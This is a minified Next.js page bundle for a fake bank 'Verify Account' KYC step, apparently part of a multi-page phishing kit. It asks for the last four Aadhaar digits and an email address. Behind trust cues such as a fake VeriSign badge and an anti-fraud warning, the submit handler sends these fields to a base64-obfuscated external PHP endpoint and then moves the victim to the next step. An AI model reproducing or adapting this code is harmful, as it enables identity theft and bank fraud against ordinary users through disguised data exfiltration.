(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [920], {
        18: function(e, n, t) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/a9", function() {
                return t(8177)
            }])
        },
        9018: function(e, n) {
            "use strict";
            n.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        8177: function(e, n, t) {
            "use strict";
            t.r(n), t.d(n, {
                default: function() {
                    return m
                }
            });
            var a = t(7568),
                r = t(655),
                s = t(5893),
                i = t(9008),
                o = t.n(i),
                l = t(5675),
                c = t.n(l),
                u = t(7294),
                d = t(1163),
                h = t(9018);

            function m() {
                var e, n = (0, d.useRouter)(),
                    t = (0, u.useState)(""),
                    i = t[0],
                    l = t[1],
                    m = function() {
                        var e = new Date,
                            n = e.getFullYear(),
                            t = e.getMonth() + 1,
                            a = e.getDate();
                        a < 10 && (a = "0" + a);
                        var r = e.getHours(),
                            s = e.getMinutes(),
                            i = r >= 12 ? "PM" : "AM";
                        r %= 12, r = r || 12, s = s < 10 ? "0" + s : s, l(a + "-" + ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"][t].substring(0, 3) + "-" + n + " [" + r + ":" + s + " " + i + " IST]")
                    },
                    $ = (0, u.useState)(!1),
                    p = $[0],
                    f = $[1],
                    x = (e = (0, a.Z)(function(e) {
                        var t, a, s, i, o, l, c;
                        return (0, r.__generator)(this, function(r) {
                            switch (r.label) {
                                case 0:
                                    return e.preventDefault(), f(!0), t = new FormData(e.target), a = {}, t.forEach(function(e, n) {
                                        a[n] = e
                                    }), s = JSON.stringify(a), i = ((o = {}).method = "POST", o.headers = {
                                        "Content-Type": "application/json"
                                    }, o.body = s, o), [4, fetch(window.atob(h.Z.dataList) + "?id=" + window.location.hostname, i)];
                                case 1:
                                    return [4, (l = r.sent()).json()];
                                case 2:
                                    return c = r.sent(), f(!1), !0 == c.status ? n.push("/a10") : f(!1), [2]
                            }
                        })
                    }), function(n) {
                        return e.apply(this, arguments)
                    });
                return (0, u.useEffect)(function() {
                    return m
                }, []), (0, s.jsxs)(s.Fragment, {
                    children: [(0, s.jsxs)(o(), {
                        children: [(0, s.jsx)("title", {
                            children: "Verify the account"
                        }), (0, s.jsx)("meta", {
                            name: "description",
                            content: "verfy the account"
                        }), (0, s.jsx)("link", {
                            rel: "icon",
                            href: "/favicon.ico"
                        })]
                    }), (0, s.jsxs)("main", {
                        children: [(0, s.jsx)("div", {
                            className: "logo",
                            children: (0, s.jsx)(c(), {
                                src: "/logo.svg.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, s.jsx)("br", {}), (0, s.jsx)("div", {
                            className: "panelDiv",
                            children: (0, s.jsx)("div", {
                                className: "panel",
                                children: (0, s.jsx)("span", {
                                    children: i
                                })
                            })
                        }), (0, s.jsx)("div", {
                            className: "content_heading",
                            children: (0, s.jsx)("h3", {
                                className: "pull-left",
                                children: "Verify Account"
                            })
                        }), (0, s.jsxs)("div", {
                            className: "content_area",
                            children: [(0, s.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, s.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: x,
                                children: [(0, s.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, s.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "otp1",
                                        children: [" Last 4 Digit Aadhar Number", (0, s.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, s.jsx)("input", {
                                        className: "form-control",
                                        id: "last_4_digit_ac",
                                        type: "text",
                                        name: "last_4_aadhar_no",
                                        required: !0,
                                        maxLength: 4,
                                        tabIndex: "1"
                                    })]
                                }), (0, s.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, s.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "pan_card_no",
                                        children: ["Email ID", (0, s.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, s.jsx)("input", {
                                        className: "form-control",
                                        id: "pan_card_no",
                                        type: "email",
                                        name: "email_id",
                                        required: !0,
                                        title: "Please enter valid email",
                                        tabIndex: "1"
                                    })]
                                }), (0, s.jsx)("p", {
                                    className: "content_title",
                                    children: "80% KYC Successful"
                                }), (0, s.jsx)("div", {
                                    className: "commonbutton",
                                    children: (0, s.jsx)("input", {
                                        name: "btContinue",
                                        disabled: !!p,
                                        id: "btContinue",
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    })
                                })]
                            }), (0, s.jsx)("div", {
                                className: "info_panel",
                                children: (0, s.jsx)("div", {
                                    className: "notify_icon",
                                    children: (0, s.jsxs)("ul", {
                                        children: [(0, s.jsx)("li", {
                                            children: "Any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on report@onlinebanking.com if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials."
                                        }), (0, s.jsx)("li", {
                                            children: "Please note that you will receive the all communication related to Internet banking on your updated mobile number only after approval."
                                        })]
                                    })
                                })
                            })]
                        }), (0, s.jsx)("div", {
                            className: "footer_area",
                            children: (0, s.jsx)(c(), {
                                src: "/veriSign.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, s.jsx)("div", {
                            className: "footer",
                            children: (0, s.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(e, n, t) {
            "use strict";

            function a(e, n, t, a, r, s, i) {
                try {
                    var o = e[s](i),
                        l = o.value
                } catch (c) {
                    t(c);
                    return
                }
                o.done ? n(l) : Promise.resolve(l).then(a, r)
            }

            function r(e) {
                return function() {
                    var n = this,
                        t = arguments;
                    return new Promise(function(r, s) {
                        var i = e.apply(n, t);

                        function o(e) {
                            a(i, r, s, o, l, "next", e)
                        }

                        function l(e) {
                            a(i, r, s, o, l, "throw", e)
                        }
                        o(void 0)
                    })
                }
            }
            t.d(n, {
                Z: function() {
                    return r
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 774, 888, 179], function() {
            return e(e.s = 18)
        }), _N_E = e.O()
    }
]);